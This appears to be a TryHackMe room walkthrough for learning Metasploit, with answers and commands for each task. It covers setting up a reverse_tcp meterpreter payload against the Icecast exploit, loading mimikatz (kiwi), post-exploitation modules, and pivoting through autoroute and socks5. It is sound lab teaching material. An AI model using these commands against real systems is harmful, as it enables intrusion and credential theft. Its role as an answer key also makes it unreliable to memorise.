# Metasploit

{% embed url="https://tryhackme.com/room/rpmetasploit" %}
https://tryhackme.com/room/rpmetasploit
{% endembed %}

## Task 2 Initializing...

#### First things first, we need to initialize the database! Let's do that now with the command:&#x20;

```bash
sudo msfdb init
```

#### We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information?

```bash
msfconsole -q
```

{% hint style="success" %}
`-q`
{% endhint %}

#### After Metasploit has started, let's go ahead and check that we've connected to the database.

```bash
msf > db_status
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 04-56-41.png>)

#### Cool! We've connected to the database, which type of database does Metasploit 5 use?

{% hint style="success" %}
`postgresql`
{% endhint %}

## Task 3 Rock 'em to the Core \[Commands]

#### Let's go ahead and start exploring the help menu.

```bash
help
```

#### The help menu has a very short one-character alias, what is it?

{% hint style="success" %}
`?`
{% endhint %}

#### Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

{% hint style="success" %}
`search`
{% endhint %}

#### Once we've found the module we want to leverage, what command we use to select it as the active module?

{% hint style="success" %}
`use`
{% endhint %}

#### How about if we want to view information about either a specific module or just the active one we have selected?

{% hint style="success" %}
`info`
{% endhint %}

#### Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

{% hint style="success" %}
`connect`
{% endhint %}

#### Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

{% hint style="success" %}
`banner`
{% endhint %}

#### We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

{% hint style="success" %}
`set`
{% endhint %}

#### Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?

{% hint style="success" %}
`setg`
{% endhint %}

#### Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

{% hint style="success" %}
`get`
{% endhint %}

#### How about changing the value of a variable to null/no value?

{% hint style="success" %}
`unset`
{% endhint %}

#### When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

{% hint style="success" %}
`spool`
{% endhint %}

#### Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

{% hint style="success" %}
`save`
{% endhint %}

## Task 4 Modules for Every Occasion!

#### Easily the most common module utilized, which module holds all of the exploit code we will use?

{% hint style="success" %}
`exploit`
{% endhint %}

#### Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

{% hint style="success" %}
`payload`
{% endhint %}

#### Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

{% hint style="success" %}
`auxiliary`
{% endhint %}

#### One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

{% hint style="success" %}
`post`
{% endhint %}

#### Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

{% hint style="success" %}
`encoder`
{% endhint %}

#### Last but not least, which module is used with buffer overflow and ROP attacks?

{% hint style="success" %}
`nop`
{% endhint %}

#### Not every module is loaded in by default, what command can we use to load different modules?

{% hint style="success" %}
`load`
{% endhint %}

## Task 5 Move that shell!

#### Metasploit comes with a built-in way to run nmap and feed it's results directly into our database.

```bash
db_nmap -n -sVC 10.10.21.39
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-18-42.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-19-03.png>)

#### What service does nmap identify running on **port 135?**

{% hint style="success" %}
`msrpc`
{% endhint %}

#### Let's go ahead and see what information we have collected in the database.

```bash
hosts
```

#### How about something else from the database, try the command `services` now.

```bash
services
```

#### One last thing, try the command `vulns` now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.&#x20;

```bash
vulns
```

#### Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type `use` followed by a unique string found within only the target exploit. For example, try this out now with the following command `use icecast`. What is the full path for our exploit that now appears on the msfconsole prompt?

```bash
msf > search icecast
msf > use 0
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-20-00.png>)

{% hint style="success" %}
`exploit/windows/http/icecast_header`
{% endhint %}

#### While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command `search multi/handler`.

```bash
msf > search multi/handler
msf > use 5
```

#### What is the name of the column on the far left side of the console that shows up next to 'Name'?

{% hint style="success" %}
`#`
{% endhint %}

#### Next, let's set the payload using this command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command `set LHOST YOUR_IP_ON_TRYHACKME`. You might have to check your IP using the command `ip addr`, it will likely be your **tun0** interface.

```bash
set payload windows/meterpreter/reverse_tcp
set LHOST 10.6.9.176
```

#### Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

```bash
use icecast
```

#### One last step before we can run our exploit. Run the command `set RHOSTS 10.10.21.39` to tell Metasploit which target to attack.

```bash
set RHOSTS 10.10.21.39
set LHOST 10.6.9.176
```

#### Once you're set those variables correctly, run the exploit now via either the command `exploit` or the command `run -j` to run this as a job.

```bash
exploit
```

#### Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

```bash
jobs
```

#### After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

```bash
sessions
sessions -i 1
```

## Task 6 We're in, now what?

#### First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`. What's the name of the spool service?

```bash
ps -S spool
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-31-50.png>)

{% hint style="success" %}
`spoolsv.exe`
{% endhint %}

#### Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

```bash
migrate 1256
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-32-46.png>)

{% hint style="success" %}
`migrate`
{% endhint %}

#### Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-33-58.png>)

{% hint style="success" %}
`getuid`
{% endhint %}

#### How about finding more information out about the system itself?

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-34-51.png>)

{% hint style="success" %}
`sysinfo`
{% endhint %}

#### This might take a little bit of googling, what do we run to load mimikatz so we can use it?

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-35-52.png>)

{% hint style="success" %}
`load kiwi`
{% endhint %}

#### Let's go ahead and figure out the privileges of our current user, what command do we run?

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-36-35.png>)

{% hint style="success" %}
`getprivs`
{% endhint %}

#### What command do we run to transfer files to our victim computer?

{% hint style="success" %}
`upload`
{% endhint %}

#### How about if we want to run a Metasploit module?

{% hint style="success" %}
`run`
{% endhint %}

#### A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-38-16.png>)

{% hint style="success" %}
`ipconfig`
{% endhint %}

#### Let's go ahead and run a few post modules from Metasploit. First, let's run the command run `post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

```bash
run post/windows/gather/checkvm
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-39-51.png>)

#### Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room [Ice](https://tryhackme.com/room/ice).

```bash
run post/multi/recon/local_exploit_suggester
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-44-11.png>)

#### Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about:

```bash
run post/windows/manage/enable_rdp
```

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-44-31.png>)

#### One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

{% hint style="success" %}
`shell`
{% endhint %}

## Task 7 Makin' Cisco Proud

#### Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the `-n` flag in your answer.

![](<../../.gitbook/assets/Screenshot from 2022-04-21 05-52-13.png>)

{% hint style="success" %}
`run autoroute -s 172.18.1.0 -n 255.255.255.0`
{% endhint %}

#### Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command `search server/socks5`. What is the full path to the socks5 auxiliary module?

```bash
search server/socks5
```

{% hint style="success" %}
`auxiliary/server/socks5`
{% endhint %}

#### Once we've started a socks server we can modify our _/etc/proxychains.conf_ file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?

{% hint style="success" %}
`proxychains`
{% endhint %}

## Reference

{% embed url="https://darkstar7471.com/resources.html" %}
